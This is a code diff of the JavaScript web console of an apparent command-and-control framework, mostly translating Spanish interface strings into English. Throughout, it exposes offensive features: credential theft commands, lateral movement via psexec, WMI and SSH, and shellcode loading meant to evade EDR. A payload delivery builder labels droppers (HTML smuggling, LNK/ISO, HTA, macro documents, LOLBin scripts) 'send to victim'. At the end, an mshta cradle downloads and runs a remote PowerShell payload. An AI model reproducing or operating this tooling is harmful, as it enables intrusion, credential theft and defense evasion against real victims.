+  'back': `<b>back</b> — close the agent console
 
   <span class="console-section">USO</span>
   back
 
   <span class="console-section">NOTAS</span>
-  • Cierra la consola y vuelve al panel de agentes
-  • El agente sigue ejecutándose en el objetivo`,
+  • Closes the console and returns to the agents panel
+  • The agent keeps running on the target`,
 };
 
 const CMD_DETAIL_HELP_EN = {
@@ -11942,13 +11942,13 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
 };
 
 const CMD_EXTRA_HELP = {
-  sysinfo: 'sysinfo — mostrar información completa del agente',
+  sysinfo: 'sysinfo — show complete agent information',
   search: 'search [root] <pattern> — buscar archivos recursivamente',
   timestomp: 'timestomp <file> [date|ref] — modificar timestamps MACB',
   'browser-creds': 'browser-creds — extraer credenciales guardadas del navegador',
   browsercreds: 'browsercreds — alias de browser-creds',
   bcreds: 'bcreds — alias de browser-creds',
-  'gpp-passwords': 'gpp-passwords — buscar contraseñas GPP en SYSVOL',
+  'gpp-passwords': 'gpp-passwords — search GPP passwords in SYSVOL',
   gpp: 'gpp — alias de gpp-passwords',
   gpppw: 'gpppw — alias de gpp-passwords',
   'wifi-creds': 'wifi-creds — extraer credenciales WiFi guardadas',
@@ -12022,7 +12022,7 @@ async function fetchSCFile(name) {
 async function bhDownloadBloodHoundZip(agentID, remotePath, label) {
   const filename = String(remotePath || '').split(/[\\/]/).pop();
   if (!filename) return false;
-  addConsoleOutputForAgent(agentID, `[*] Descargando ${filename} desde el agente…`, '', null);
+  addConsoleOutputForAgent(agentID, `[*] Downloading ${filename} from agent…`, '', null);
   const queued = await api('POST', `/api/agents/${agentID}/task`, {
     type: 'DOWNLOAD', args: remotePath,
   });
@@ -12044,12 +12044,12 @@ async function bhDownloadBloodHoundZip(agentID, remotePath, label) {
     await sleep(1000);
   }
   if (!uploaded) {
-    addConsoleOutputForAgent(agentID, '', `${filename} no apareció en uploads`, null);
+    addConsoleOutputForAgent(agentID, '', `${filename} did not appear in uploads`, null);
     return false;
   }
   addConsoleOutputForAgent(agentID,
-    `[i] ${filename} detectado; pulsa «Importar» para cargarlo en BloodHound`, '', null);
-  toast('ZIP de SharpHound detectado: pulsa Importar', 'blue');
+    `[i] ${filename} detected; click «Import» to load it in BloodHound`, '', null);
+  toast('SharpHound ZIP detected: click Import', 'blue');
   bhRefreshFiles();
   return true;
 }
@@ -12469,8 +12469,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       const validMethods = ['psexec','wmi','winrm','ssh','dcom','smbexec','smb','atexec','at','runas'];
       if (!validMethods.includes(lMethod) || lp.length < 3) {
         addConsoleOutput(
-          'uso: jump <método> <host> <payload.exe> [user] [pass]\n\n' +
-          'Métodos:\n' +
+          'uso: jump <method> <host> <payload.exe> [user] [pass]\n\n' +
+          'Methods:\n' +
           '  psexec  — SMB admin$ + SCM service (SERVICES→agent)\n' +
           '  smbexec — SMB + cmd.exe como servicio (SERVICES→cmd→agent, sin binario como servicio)\n' +
           '  atexec  — MS-TSCH scheduled task runas SYSTEM, se autodestruye\n' +
@@ -12552,8 +12552,8 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (!payload) {
         addConsoleOutput(
           'uso: udrl <shellcode.bin>\n\n' +
-          'Carga shellcode en memoria respaldada por una DLL legítima del sistema.\n' +
-          'La región de memoria aparece al EDR como perteneciente a un módulo real.\n\n' +
+          'Loads shellcode into memory backed by a legitimate system DLL.\n' +
+          'The memory region appears to the EDR as belonging to a real module.\n\n' +
           'Ejemplo:\n' +
           '  udrl shellcode.bin',
           '', null);
@@ -13036,7 +13036,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       if (sep.length < 4) {
         addConsoleOutput(
           'uso: ssh-exec <host> [port] <user> <pass> <cmd>\n\n' +
-          'Ejecuta un comando en un host remoto vía SSH (password auth).\n\n' +
+          'Runs a command on a remote host via SSH (password auth).\n\n' +
           'Ejemplos:\n' +
           '  ssh-exec 192.168.1.50 root r00tpass id\n' +
           '  ssh-exec 192.168.1.50 2222 root r00tpass whoami',
@@ -13090,7 +13090,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
   try {
     const unsupportedReason = unsupportedTaskForAgent(agentID, taskType);
     if (unsupportedReason) {
-      addConsoleOutput('', `${taskType} no está disponible para este agente: ${unsupportedReason}`, null);
+      addConsoleOutput('', `${taskType} is not available for this agent: ${unsupportedReason}`, null);
       return;
     }
     const r = await api('POST', `/api/agents/${agentID}/task`, {type:taskType, args:taskArgs, payload});
@@ -13207,7 +13207,7 @@ async function pollResult(taskID, agentID, timeoutMs = 120000, meta = {}) {
         const taskFailed = !!err || /\[!\]\s*(?:fork-and-run timeout|fork-and-run child exited|assembly threw|invoke_3 hr=)/i.test(out);
         if (meta.label && !meta.artifactPath) {
           addConsoleOutputForAgent(aid,
-            taskFailed ? `[!] ${meta.label} falló` : `[✓] ${meta.label} completado`,
+            taskFailed ? `[!] ${meta.label} failed` : `[✓] ${meta.label} completed`,
             '', null);
         }
         if (!taskFailed && meta.artifactPath) {
@@ -13263,7 +13263,7 @@ async function pollResult(taskID, agentID, timeoutMs = 120000, meta = {}) {
     } catch(e) {}
   }
   if (_sessionGeneration === generation && !resultReceived) {
-    addConsoleOutputForAgent(aid, `[!] La tarea #${taskID} no terminó dentro del tiempo de espera; revisa el estado del agente.`, '', null);
+    addConsoleOutputForAgent(aid, `[!] Task #${taskID} did not finish within the timeout; check the agent status.`, '', null);
   }
   if (_sessionGeneration === generation) delete pollTimers[key];
 }
@@ -13318,7 +13318,7 @@ function clearAgentSelection() {
 function killSelectedAgents() {
   const ids = [...selectedAgentIds];
   if (!ids.length) return;
-  showConfirm('Kill agents', `¿Terminar ${ids.length} agente(s) seleccionado(s)? El proceso se terminará en el próximo beacon.`, async () => {
+  showConfirm('Kill agents', `Terminate ${ids.length} selected agent(s)? The process will be killed on the next beacon.`, async () => {
     await Promise.all(ids.map(id => api('POST', `/api/agents/${id}/kill`)));
     ids.forEach(id => {
       pendingKillIds.add(id);
@@ -13327,14 +13327,14 @@ function killSelectedAgents() {
     });
     selectedAgentIds.clear();
     renderAgents();
-    toast(`Kill enviado a ${ids.length} agente(s) — terminarán en el próximo beacon`, 'red');
+    toast(`Kill sent to ${ids.length} agent(s) — will terminate on next beacon`, 'red');
   });
 }
 
 function removeSelectedAgents() {
   const ids = [...selectedAgentIds];
   if (!ids.length) return;
-  showConfirm('Eliminar registros', `¿Eliminar ${ids.length} registro(s) de la base de datos?`, async () => {
+  showConfirm('Delete records', `Delete ${ids.length} record(s) from the database?`, async () => {
     for (const id of ids) await api('DELETE', `/api/agents/${id}/delete`);
     agents = agents.filter(a => !ids.includes(a.id));
     selectedAgentIds.clear();
@@ -13346,7 +13346,7 @@ function removeSelectedAgents() {
 function purgeDeadAgents() {
   const deadIds = agents.filter(a => agentStatus(a).color === 'gray').map(a => a.id);
   if (!deadIds.length) { toast('No hay agentes muertos', 'yellow'); return; }
-  showConfirm('Purge dead agents', `¿Eliminar ${deadIds.length} agente(s) muerto(s) de la base de datos?`, async () => {
+  showConfirm('Purge dead agents', `Delete ${deadIds.length} dead agent(s) from the database?`, async () => {
     let removed = 0;
     for (const id of deadIds) {
       const r = await api('DELETE', `/api/agents/${id}/delete`);
@@ -13367,14 +13367,14 @@ async function saveAgentNote(id, note) {
 }
 
 function killAgent(id) {
-  showConfirm('Kill Agent', `¿Terminar el proceso del agente ${id.substring(0,8)}?\nEl registro se mantiene en la DB (usa "Delete Record" para borrarlo).`, async () => {
+  showConfirm('Kill Agent', `Terminate agent process ${id.substring(0,8)}?\nThe record remains in the DB (use "Delete Record" to remove it).`, async () => {
     const r = await api('POST', `/api/agents/${id}/kill`);
     if (r?.ok) {
       pendingKillIds.add(id);
       const ag = agents.find(a => a.id === id);
       if (ag) ag.active = false;
       renderAgents();
-      toast('Kill queued — proceso terminará en el próximo beacon', 'red');
+      toast('Kill queued — process will terminate on next beacon', 'red');
     }
   });
 }
@@ -13451,7 +13451,7 @@ async function startListener() {
 }
 
 async function stopListener(id) {
-  showConfirm('Stop Listener', `¿Detener listener #${id}?`, async () => {
+  showConfirm('Stop Listener', `Stop listener #${id}?`, async () => {
     const r = await api('DELETE', `/api/jobs/${id}`);
     if (r.ok) { toast('Listener stopped', 'yellow'); refreshListeners(); }
     else toast('Error: ' + (r.error || 'unknown'), 'red');
@@ -13552,12 +13552,12 @@ const _dlvFmtHints = {
   iso:      'ISO montable que contiene el LNK. Evita MOTW (Mark-of-the-Web) porque el volumen montado no hereda la zona de Internet.',
   hta:      'HTA = HTML Application. Lo ejecuta mshta.exe (trusted binary). PS cradle en el onload del VBScript.',
   bat:      'BAT minimalista que llama a PowerShell con un cradle codificado en base64.',
-  ps1:      'Script PowerShell puro. IEX + DownloadString o DownloadData + shellcode injection vía CreateThread reflective.',
+  ps1:      'Pure PowerShell script. IEX + DownloadString or DownloadData + shellcode injection via reflective CreateThread.',
   jscript:  'JScript (.js) lanzado con wscript.exe. Usa ActiveXObject(\"WScript.Shell\") para PS cradle.',
   vbscript: 'VBScript (.vbs) con CreateObject(\"WScript.Shell\"). Compatible con cualquier Windows moderno.',
   sct:      'Scriptlet COM (.sct). Se registra y ejecuta via: regsvr32 /s /n /u /i:&lt;URL&gt; scrobj.dll',
   html:     'EXE del agente embebido en base64 dentro del HTML. Al abrir, JS hace auto-download. No necesita Stage URL — el agente va dentro del archivo.',
-  docm:     'Word macro-enabled document (.docm). AutoOpen + Document_Open ejecutan un PS cradle via WScript.Shell. Requiere que la víctima habilite macros.',
+  docm:     'Word macro-enabled document (.docm). AutoOpen + Document_Open run a PS cradle via WScript.Shell. Requires the victim to enable macros.',
   lolbin:   'Genera 6 .bat independientes (certutil, bitsadmin, msiexec, regsvr32, mshta, wmic) que descargan y ejecutan el agente desde la Staging URL. Sin PowerShell.',
 };
 
@@ -13639,7 +13639,7 @@ async function dlvLaunchTunnel(provider) {
   }
 
   const providerLabels = {
-    cloudflared: 'Cloudflare (descargando si es necesario…)',
+    cloudflared: 'Cloudflare (downloading if needed…)',
     localtunnel: 'LocalTunnel via npx…',
     serveo: 'Serveo via SSH…',
     bore: 'bore.pub…',
@@ -13657,14 +13657,14 @@ async function dlvLaunchTunnel(provider) {
     setStatus('✓ Activo: ' + url, 'var(--green)');
     refreshStager();
   } else {
-    const err = r?.error || 'Error al iniciar tunnel';
+    const err = r?.error || 'Error starting tunnel';
     let hint = '';
     if (err.includes('installed') || err.includes('not found') || err.includes('executable')) {
       const installs = {
-        cloudflared: '→ Se intentará descargar automáticamente. Reintenta.',
+        cloudflared: '→ Will try to download automatically. Retry.',
         localtunnel: '→ Instala Node.js: sudo apt install nodejs npm',
         bore: '→ Instala: cargo install bore-cli  o  go install github.com/ekzhang/bore@latest',
-        serveo: '→ Verifica que SSH esté disponible: which ssh',
+        serveo: '→ Verify SSH is available: which ssh',
       };
       hint = installs[provider] || '';
     }
@@ -13752,7 +13752,7 @@ async function unifiedBuild() {
         <div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Stager listo</div>
         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
           <code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(fname)}</code>
-          <a href="${blobURL}" download="${esc(fname)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>
+          <a href="${blobURL}" download="${esc(fname)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Download</a>
         </div>
         <div style="font-size:10px;color:var(--text3);line-height:1.6">
           Lenguaje: C (WinHTTP, sin CRT) · ~17 KB<br>
@@ -13791,16 +13791,16 @@ function renderUnifiedResult(resEl, r) {
     html += `<div style="font-size:10px;font-weight:700;color:var(--accent);margin-bottom:8px">Artefacto listo</div>`;
     html += `<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:6px">`;
     html += `<code style="font-size:11px;color:var(--text);word-break:break-all;flex:1">${esc(deliverName)}</code>`;
-    html += `<a href="${artifactDownloadURL(deliverPath)}" download="${esc(deliverName)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Descargar</a>`;
+    html += `<a href="${artifactDownloadURL(deliverPath)}" download="${esc(deliverName)}" class="btn btn-ghost btn-sm" style="white-space:nowrap">⬇ Download</a>`;
     html += `</div>`;
     if (d.stage_url || d.bin_stage) {
       const su = d.stage_url || d.bin_stage;
       html += `<div style="font-size:10px;color:var(--text3);margin-top:2px">Stage URL: <code style="color:var(--text2)">${esc(su)}</code>`;
-      html += ` <button class="btn btn-ghost btn-sm" style="padding:1px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${su.replace(/'/g,"\\'")}').then(()=>toast('Copiado','green'))">⎘</button></div>`;
+      html += ` <button class="btn btn-ghost btn-sm" style="padding:1px 5px;font-size:10px" onclick="navigator.clipboard.writeText('${su.replace(/'/g,"\\'")}').then(()=>toast('Copied','green'))">⎘</button></div>`;
     }
     if (d.raw_size && d.compressed_size) {
       const savings = Math.round((1 - d.compressed_size / d.raw_size) * 100);
-      html += `<div style="font-size:10px;color:var(--text3);margin-top:2px">Implant: ${(d.raw_size/1024).toFixed(0)} KB → ${(d.compressed_size/1024).toFixed(0)} KB comprimido (${savings}% reducción)</div>`;
+      html += `<div style="font-size:10px;color:var(--text3);margin-top:2px">Implant: ${(d.raw_size/1024).toFixed(0)} KB → ${(d.compressed_size/1024).toFixed(0)} KB compressed (${savings}% reduction)</div>`;
     }
     html += `</div>`;
   }
@@ -13984,7 +13984,7 @@ async function buildLoader() {
         <div style="font-size:11px;display:flex;flex-direction:column;gap:4px">
           <div><span style="color:var(--text3)">Loader:</span> <code>${esc(loaderFile)}</code></div>
           <div><span style="color:var(--text3)">Implant stageado:</span> agent_${esc(transport)}_${esc(lang)}.exe</div>
-          <div><span style="color:var(--text3)">Tamaño:</span> ${sizeLabel}</div>
+          <div><span style="color:var(--text3)">Size:</span> ${sizeLabel}</div>
           <div style="word-break:break-all"><span style="color:var(--text3)">Stage URL:</span> <code style="font-size:10px">${esc(stageEndpt)}</code></div>
           ${maxdl > 0 ? `<div style="color:var(--yellow)">⚠ Stage expira tras ${maxdl} descarga${maxdl>1?'s':''}</div>` : ''}
         </div>
@@ -14182,7 +14182,7 @@ Add-Type \$MyBusinessLogic
 
 function pslFillFromTunnel() {
   const url = stagerState?.public_url;
-  if (!url) { toast('No hay tunnel activo — inícialo en la pestaña Stager', 'error'); return; }
+  if (!url) { toast('No active tunnel — start one in the Stager tab', 'error'); return; }
   document.getElementById('psl-payload-url').value  = url + '/agent.bin';
   document.getElementById('psl-script-host').value  = url;
   toast('URLs rellenadas desde tunnel activo');
@@ -14193,7 +14193,7 @@ function pslGenerate() {
   const scriptHost = document.getElementById('psl-script-host').value.trim().replace(/\/$/, '');
   const scriptName = document.getElementById('psl-script-name').value.trim() || 'loader.ps1';
   if (!payloadURL) { toast('Introduce la URL del payload .bin', 'error'); return; }
-  if (!scriptHost) { toast('Introduce la URL base donde alojarás el .ps1', 'error'); return; }
+  if (!scriptHost) { toast('Enter the base URL where you will host the .ps1', 'error'); return; }
 
   const scriptContent = PSL_TEMPLATE.replace('%%PAYLOAD_URL%%', payloadURL);
   const scriptURL     = scriptHost + '/' + scriptName;
@@ -14251,7 +14251,7 @@ async function loadNetInfo() {
               || allIPs[0];
     const hostEl = document.getElementById('pay-host');
     if (hostEl && best) {
-      if (!hostEl.value) hostEl.value = best.ip;  // solo si vacío
+      if (!hostEl.value) hostEl.value = best.ip;  // only if empty
       hostEl.placeholder = best.ip;
     }
     if (hint) hint.textContent = allIPs.length ? `— ${allIPs.length} IP${allIPs.length>1?'s':''} detectada${allIPs.length>1?'s':''}` : '';
@@ -14272,11 +14272,11 @@ async function loadC2PubIP() {
 // ── Delivery Builder ─────────────────────────────────────────────────────────
 
 const DLV_NOTES = {
-  html:      'El EXE se incrusta en el HTML. La víctima lo descarga al abrir la página.',
+  html:      'The EXE is embedded in the HTML. The victim downloads it on page open.',
   lnk:       'Shortcut que lanza PowerShell oculto. Icono de documento shell32.dll.',
-  iso:       'ISO con el LNK dentro. Windows lo monta automáticamente al hacer doble clic.',
-  zip:       'ZIP con el LNK dentro. Útil cuando ISO está bloqueado por correo.',
-  hta:       'Aplicación HTA ejecutada por mshta.exe. Bypassa AppLocker en configuraciones por defecto.',
+  iso:       'ISO with the LNK inside. Windows mounts it automatically on double-click.',
+  zip:       'ZIP with the LNK inside. Useful when ISO is blocked by email.',
+  hta:       'HTA application run by mshta.exe. Bypasses AppLocker in default configurations.',
   ps1:       'Script PS1 puro. Útil para paste-and-run o macro que llama a IEX.',
   bat:       'Batch file que lanza PS codificado. Compatible con todas las versiones de Windows.',
   jscript:   'JScript (.js) ejecutado por wscript.exe. Sin dependencia de PowerShell visible.',
@@ -14302,8 +14302,8 @@ async function dlvRefreshArtifacts() {
     const r = await api('GET', '/api/artifacts');
     if (!r.ok) return;
     const files = r.data || [];
-    sel.innerHTML = '<option value="">— selecciona un payload —</option>';
-    // Solo EXE para la mayoría de wrappers (apiDeliver convierte a shellcode internamente)
+    sel.innerHTML = '<option value="">— select a payload —</option>';
+    // Only EXE for most wrappers (apiDeliver converts to shellcode internally)
     const exts = ['.exe'];
     files.filter(f => exts.some(e => f.filename.toLowerCase().endsWith(e)))
          .sort((a,b) => b.created_at.localeCompare(a.created_at))
@@ -14521,7 +14521,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
 async function cleanPayloads(dir) {
   const label = dir === 'payloads' ? 'payloads' : 'loaders (delivery)';
-  showConfirm(`Limpiar ${label}`, `¿Eliminar todos los archivos de bin/${dir}/? No se puede deshacer.`, async () => {
+  showConfirm(`Clean ${label}`, `Delete all files from bin/${dir}/? This cannot be undone.`, async () => {
     try {
       if (dir === 'payloads') {
         const r = await api('GET', '/api/artifacts');
@@ -14565,9 +14565,9 @@ function stagerFillFromLoader() {
   if (!el) return;
   if (_lastLoaderStageURL) {
     el.value = _lastLoaderStageURL;
-    toast('Stage URL del último Loader cargada', 'green');
+    toast('Stage URL from last Loader loaded', 'green');
   } else {
-    toast('Aún no has generado ningún Loader — ve a modo Loader, genera uno y vuelve aquí', 'yellow');
+    toast('No Loader generated yet — go to Loader mode, generate one, and come back', 'yellow');
   }
 }
 
@@ -14599,7 +14599,7 @@ async function buildPayload() {
   let host = document.getElementById('pay-host').value.trim();
   const port = document.getElementById('pay-port').value.trim() || '8080';
 
-  // Fallback: si el campo está vacío usar la primera IP detectada de eth0
+  // Fallback: if the field is empty, use the first detected eth0 IP
   if (!host && c2IPs?.length) {
     host = c2IPs[0];
     document.getElementById('pay-host').value = host;
@@ -14611,7 +14611,7 @@ async function buildPayload() {
   const serverURL = host ? (transport === 'tcp' ? `${host}:${port}` : `${scheme}://${host}:${port}`) : '';
 
   if (!serverURL) {
-    toast('⚠ Host vacío — pulsa ↻ para detectar IPs o escribe la IP del C2.', 'error');
+    toast('⚠ Empty host — press ↻ to detect IPs or enter the C2 IP.', 'error');
     document.getElementById('pay-host')?.focus();
     return;
   }
@@ -14787,23 +14787,23 @@ function renderBuildResult(container, data) {
     return;
   }
   const labels = {
-    exe:'Windows EXE — enviar a la víctima', dll:'Windows DLL', bin:'Shellcode raw (.bin)',
-    enc:'Shellcode cifrado — ya staged automáticamente', stub:'C loader stub', linux:'Linux ELF', macho:'macOS Mach-O',
-    html:'HTML Smuggling — enviar a la víctima (EXE embebido, sin staging)',
-    lnk:'LNK shortcut — enviar a la víctima',
-    iso:'ISO image — enviar a la víctima (contiene el LNK)',
-    zip:'ZIP — enviar a la víctima (contiene el LNK)',
-    hta:'HTA dropper — enviar a la víctima',
-    ps1:'PowerShell script — enviar a la víctima',
-    bat:'Batch file — enviar a la víctima',
-    js:'JScript dropper — enviar a la víctima',
-    vbs:'VBScript dropper — enviar a la víctima',
+    exe:'Windows EXE — send to victim', dll:'Windows DLL', bin:'Raw shellcode (.bin)',
+    enc:'Encrypted shellcode — already staged automatically', stub:'C loader stub', linux:'Linux ELF', macho:'macOS Mach-O',
+    html:'HTML Smuggling — send to victim (embedded EXE, no staging)',
+    lnk:'LNK shortcut — send to victim',
+    iso:'ISO image — send to victim (contains LNK)',
+    zip:'ZIP — send to victim (contains LNK)',
+    hta:'HTA dropper — send to victim',
+    ps1:'PowerShell script — send to victim',
+    bat:'Batch file — send to victim',
+    js:'JScript dropper — send to victim',
+    vbs:'VBScript dropper — send to victim',
     sct:'Scriptlet SCT — alojar en servidor, invocar con regsvr32',
-    wsf:'Windows Script File — enviar a la víctima',
-    docm:'Word DOCM — enviar a la víctima (requiere Enable Macros)',
+    wsf:'Windows Script File — send to victim',
+    docm:'Word DOCM — send to victim (requires Enable Macros)',
     bin_stage:'Stage URL — ya activa en el C2 (no subir manualmente)',
     runner_stage:'Stage URL runner DLL — ya activa en el C2',
-    ps1_stage:'Stage URL loader PS1 — ya activa en el C2 (el LNK la descarga automáticamente)',
+    ps1_stage:'Stage URL loader PS1 — already active on C2 (LNK downloads it automatically)',
     exe_stage:'Stage URL EXE — LOLBin la descarga directamente',
     certutil:'LOLBin BAT — certutil -urlcache -split -f … (descarga+exec sin PS)',
     bitsadmin:'LOLBin BAT — bitsadmin /transfer … (descarga+exec sin PS)',
@@ -14861,7 +14861,7 @@ async function payStageFile(serverPath, filename) {
       showTab('stager');
     } else toast(r?.error || 'Stage failed', 'error');
   };
-  showChoice('Stage File', `"${filename}" — ¿Cómo quieres servirlo?\n\nOne-Shot: el archivo se elimina tras la primera descarga.\nPermanente: disponible indefinidamente.`, [
+  showChoice('Stage File', `"${filename}" — How do you want to serve it?\n\nOne-Shot: the file is deleted after the first download.\nPermanent: available indefinitely.`, [
     {label:'One-Shot',   variant:'primary', onClick: () => doStage(true)},
     {label:'Permanente', variant:'ghost',   onClick: () => doStage(false)},
   ]);
@@ -14922,12 +14922,12 @@ async function donutConvert() {
 
 // ── sRDI converter ────────────────────────────────────────────────────────────
 function srdiFileSelected(inp) {
-  document.getElementById('srdi-label').textContent = inp.files[0]?.name || 'Click o arrastra una .dll aquí';
+  document.getElementById('srdi-label').textContent = inp.files[0]?.name || 'Click or drag a .dll here';
 }
 
 async function srdiConvert() {
   const file = document.getElementById('srdi-file').files[0];
-  if (!file) { toast('Selecciona un .dll primero', 'error'); return; }
+  if (!file) { toast('Select a .dll first', 'error'); return; }
   const res  = document.getElementById('srdi-result');
   const func = document.getElementById('srdi-func').value.trim();
   const clearHeader = document.getElementById('srdi-clear-header').checked;
@@ -14972,7 +14972,7 @@ async function srdiConvert() {
     const a    = document.createElement('a');
     a.href = url; a.download = file.name.replace(/\.dll$/i, '') + '.srdi.bin'; a.click();
     URL.revokeObjectURL(url);
-    res.innerHTML = `<span style="color:var(--accent)">✓ ${bytes.length} bytes → descargando .srdi.bin</span>`;
+    res.innerHTML = `<span style="color:var(--accent)">✓ ${bytes.length} bytes → downloading .srdi.bin</span>`;
   }
 }
 
@@ -15184,7 +15184,7 @@ function credSelectAll() {
 async function credDelSelected() {
   const ids = [...document.querySelectorAll('.cred-check:checked')].map(cb => parseInt(cb.dataset.id));
   if (!ids.length) return;
-  showConfirm('Borrar selección', `¿Eliminar ${ids.length} credencial${ids.length>1?'es':''}?`, async () => {
+  showConfirm('Delete selection', `Delete ${ids.length} credential${ids.length>1?'s':''}?`, async () => {
     let ok = 0;
     for (const id of ids) {
       const r = await api('DELETE', `/api/creds/${id}`);
@@ -15197,7 +15197,7 @@ async function credDelSelected() {
 
 async function credDelAll() {
   if (!creds.length) return;
-  showConfirm('Borrar todas', `¿Eliminar las ${creds.length} credenciales del Loot? Esta acción no se puede deshacer.`, async () => {
+  showConfirm('Delete all', `Delete all ${creds.length} Loot credentials? This action cannot be undone.`, async () => {
     let ok = 0;
     for (const c of [...creds]) {
       const r = await api('DELETE', `/api/creds/${c.id}`);
@@ -15275,7 +15275,7 @@ async function credSave() {
 async function addCred() { await credSave(); }
 
 async function delCred(id) {
-  showConfirm('Eliminar credencial', `¿Eliminar credencial #${id}?`, async () => {
+  showConfirm('Delete credential', `Delete credential #${id}?`, async () => {
     const r = await api('DELETE', `/api/creds/${id}`);
     if (r.ok) { toast('Credencial eliminada', 'yellow'); loadCreds(); }
     else toast('Error: ' + r.error, 'red');
@@ -15286,7 +15286,7 @@ async function delUpload(agentId, filename) {
   const path = agentId
     ? `${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}`
     : encodeURIComponent(filename);
-  showConfirm('Eliminar archivo', `¿Eliminar "${filename}"?`, async () => {
+  showConfirm('Delete file', `Delete "${filename}"?`, async () => {
     const r = await api('DELETE', `/api/dl/${path}`);
     if (r?.ok) { toast('Archivo eliminado', 'yellow'); loadDownloads(); loadScreenshots(); }
     else toast('Error: ' + (r?.error || 'unknown'), 'red');
@@ -15672,7 +15672,7 @@ function tlExpand(idx) {
   document.getElementById('tl-exp-type').textContent    = e.Type  || '';
   document.getElementById('tl-exp-host').textContent    = e.Hostname ? `${e.Hostname} / ${e.Username||''}` : '';
   document.getElementById('tl-exp-time').textContent    = e.QueuedAt ? new Date(e.QueuedAt).toLocaleString() : '';
-  document.getElementById('tl-exp-args').textContent    = e.Args   || '(vacío)';
+  document.getElementById('tl-exp-args').textContent    = e.Args   || '(empty)';
   document.getElementById('tl-exp-output').textContent  = e.Output || '(sin output)';
   document.getElementById('tl-exp-error').textContent   = e.Error  || '';
   document.getElementById('tl-exp-error-row').style.display = e.Error ? '' : 'none';
@@ -16118,8 +16118,8 @@ function renderMITRE() {
   const sumEl = document.getElementById('mitre-summary');
   if (sumEl) {
     sumEl.textContent = totalHit
-      ? `${totalHit} técnica${totalHit>1?'s':''} observada${totalHit>1?'s':''} en ${tacticsHit} táctica${tacticsHit>1?'s':''}`
-      : 'Sin actividad registrada aún';
+      ? `${totalHit} technique${totalHit>1?'s':''} observed in ${tacticsHit} tactic${tacticsHit>1?'s':''}`
+      : 'No activity recorded yet';
   }
 }
 
@@ -17051,9 +17051,9 @@ let _fxPayloadAll = [];
 
 async function fxShowPayloadPicker() {
   document.getElementById('inject-modal-title').textContent = 'Upload Payload to Agent';
-  document.getElementById('inject-modal-desc').textContent = `Destino: ${fxCurrentPath}`;
+  document.getElementById('inject-modal-desc').textContent = `Destination: ${fxCurrentPath}`;
   const listEl = document.getElementById('inject-file-list');
-  listEl.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px">Cargando...</div>';
+  listEl.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px">Loading...</div>';
   openModal('modal-inject');
 
   const [ra, ru] = await Promise.all([api('GET','/api/artifacts'), api('GET','/api/uploads')]);
@@ -17071,7 +17071,7 @@ async function fxShowPayloadPicker() {
   // Build search box + list container inside the modal body
   listEl.innerHTML = `
     <input id="fx-payload-search"
-      placeholder="Buscar payload… (nombre, extensión)"
+      placeholder="Search payload… (name, extension)"
       style="width:100%;box-sizing:border-box;padding:6px 10px;margin-bottom:8px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;color:var(--text1);font-size:12px;font-family:var(--font-mono)"
       oninput="fxFilterPayloads()" autofocus>
     <div id="fx-payload-list" style="display:flex;flex-direction:column;gap:4px"></div>`;
@@ -17089,7 +17089,7 @@ function fxFilterPayloads() {
 function fxRenderPayloadList(items) {
   const el = document.getElementById('fx-payload-list');
   if (!el) return;
-  if (!items.length) { el.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px">Sin resultados.</div>'; return; }
+  if (!items.length) { el.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px">No results.</div>'; return; }
   el.innerHTML = items.map(f => `
     <div style="display:flex;align-items:center;background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:7px 10px;cursor:pointer;gap:10px"
          onclick="fxPushPayload('${esc(f.name).replace(/'/g,"\\'")}');closeModal('modal-inject')"
@@ -17245,7 +17245,7 @@ function showChoice(title, msg, actions) {
   document.getElementById('choice-title').textContent = title;
   document.getElementById('choice-msg').textContent   = msg;
   const footer = document.getElementById('choice-footer');
-  footer.innerHTML = '<button class="btn btn-ghost" onclick="closeModal(\'modal-choice\')">Cancelar</button>';
+  footer.innerHTML = '<button class="btn btn-ghost" onclick="closeModal(\'modal-choice\')">Cancel</button>';
   actions.forEach(a => {
     const btn = document.createElement('button');
     btn.className = 'btn btn-' + (a.variant || 'primary');
@@ -17542,7 +17542,7 @@ function stagerUpdateSelCount() {
 function stagerDeleteSelected() {
   const tokens = [...document.querySelectorAll('.stager-file-cb:checked')].map(c => c.value).filter(Boolean);
   if (!tokens.length) return;
-  showConfirm('Eliminar ficheros', `¿Eliminar ${tokens.length} fichero(s) staged?`, async () => {
+  showConfirm('Delete files', `Delete ${tokens.length} staged file(s)?`, async () => {
     let ok = 0, fail = 0;
     for (const t of tokens) {
       const r = await api('DELETE', '/api/stager/files/'+t);
@@ -17962,7 +17962,7 @@ function renderCradles(url, name) {
   cradles.push({
     label: '⚡ OPSEC — PS via COM Automation (no powershell.exe binary)',
     code: `mshta "javascript:var o=new ActiveXObject('System.Object');var a=o.GetType().Assembly;var T=a.GetType('System.Management.Automation.PowerShell');var ps=T.InvokeMember('Create',256,null,null,null);var h=new ActiveXObject('MSXML2.XMLHTTP');h.open('GET','${url}',false);h.setRequestHeader('bypass-tunnel-reminder','1');h.send();ps.AddScript(h.responseText);ps.Invoke();close()"`,
-    note: 'Crea un runspace PowerShell vía COM (System.Management.Automation) dentro de mshta.exe — powershell.exe no aparece en el árbol de procesos. Requiere .NET Framework 3.5 y payload .ps1. No compatible con sistemas .NET 4.x-only sin 3.5 habilitado.',
